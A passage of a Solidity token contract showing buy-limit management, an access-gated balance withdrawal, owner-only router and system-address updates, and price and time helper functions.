        if (limitAmount > 0 && !_isInLimitedList[account]) {
            _limitedAddresses.push(account);
            _isInLimitedList[account] = true;
        } else if (limitAmount == 0 && _isInLimitedList[account]) {
            _removeFromLimitedList(account);
        }
        buyLimit[account] = limitAmount + buyLimit[account];
    }

    function batchSetBuyLimit(
        address[] calldata accounts,
        uint256 limitAmount
    ) external {
        _checkGscStaking();
        if (accounts.length == 0) revert GSCUtils.EmptyAccounts();
        for (uint256 i = 0; i < accounts.length; i++) {
            address account = accounts[i];
            if (account == address(0)) continue;

            if (limitAmount > 0 && !_isInLimitedList[account]) {
                _limitedAddresses.push(account);
                _isInLimitedList[account] = true;
            } else if (limitAmount == 0 && _isInLimitedList[account]) {
                _removeFromLimitedList(account);
            }
            buyLimit[account] = limitAmount + buyLimit[account];
        }
    }


    function setGscStorage(address _gscStorage) external {
        _checkGscStaking();
        gscStorage = IGSCStorage(_gscStorage);
    }

    function withdrawToken(address token, address _to) external {
        _checkGscStaking();
        if (_to == address(0)) revert GSCUtils.WithdrawToZero();
        if (_to == address(this)) revert GSCUtils.WithdrawToSelf();
        if (token == address(0)) {
            uint256 balance = address(this).balance;
            if (balance == 0) revert GSCUtils.NoPOLBalance();
            (bool success, ) = payable(_to).call{value: balance}("");
            if (!success) revert GSCUtils.WithdrawPOLFailed();
        } else {
            IERC20 erc20 = IERC20(token);
            uint256 balance = erc20.balanceOf(address(this));
            if (balance == 0) revert GSCUtils.NoTokenBalance();
            bool success = erc20.transfer(_to, balance);
            if (!success) revert GSCUtils.WithdrawERC20Failed();
        }
    }

    function updateRouter(address _router) external onlyOwner {
        if (_router == address(0)) revert GSCUtils.InvalidRouter();
        IPancakeRouter02 router = IPancakeRouter02(_router);

        address wethAddr = router.WETH();
        if (wethAddr == address(0)) revert GSCUtils.InvalidWETH();

        address factoryAddr = router.factory();
        if (factoryAddr == address(0)) revert GSCUtils.InvalidFactory();

        pancakeRouter = _router;
        wmatic = IWMATIC(wethAddr);

        address newLpPair = _getTokenLpPair();
        if (newLpPair == address(0)) revert GSCUtils.LPPoolEmpty();

        pancakePair = newLpPair;

        systemAddresses[pancakeRouter] = true;
        systemAddresses[address(wmatic)] = true;

        _approve(address(this), pancakeRouter, type(uint256).max);
        _approve(newLpPair, pancakeRouter, type(uint256).max);
    }

    function updateSysAddresses(
        address[] calldata accounts,
        bool isEnb
    ) external onlyOwner{
        for (uint256 i = 0; i < accounts.length; i++) {
            address account = accounts[i];
            if (systemAddresses[account] == isEnb) continue;
            systemAddresses[account] = isEnb;
        }
    }

    function updateOpenTime() external onlyOwner {
        
        if(BUY_OPEN_TIME > block.timestamp){
            BUY_OPEN_TIME = block.timestamp;
        }
    }

    function updateDailyPrice() external onlyOwner {
        updateRealTimePrice();
        resetDailyPrice();
    }

    function updateGscStorage(address _gscStorage) external onlyOwner {
        gscStorage = IGSCStorage(_gscStorage);
    }

    function getCurrentPriceDropRate() external view returns (uint256) {
        if (
            dailyBasePrice == 0 || lastPrice == 0 || lastPrice >= dailyBasePrice
        ) return 0;
        uint256 priceDrop = dailyBasePrice - lastPrice;
        return (priceDrop * 100) / dailyBasePrice;
    }

    function getBeijing8AmUTC() public view returns (uint256) {
        uint256 currentBeijingTime = block.timestamp + 8 * 3600;
        uint256 beijingDayStart = (currentBeijingTime / 86400) * 86400;
        return beijingDayStart;
    }

    function getBuyOpenTime() external view returns (uint256) {
        return BUY_OPEN_TIME;
    }
}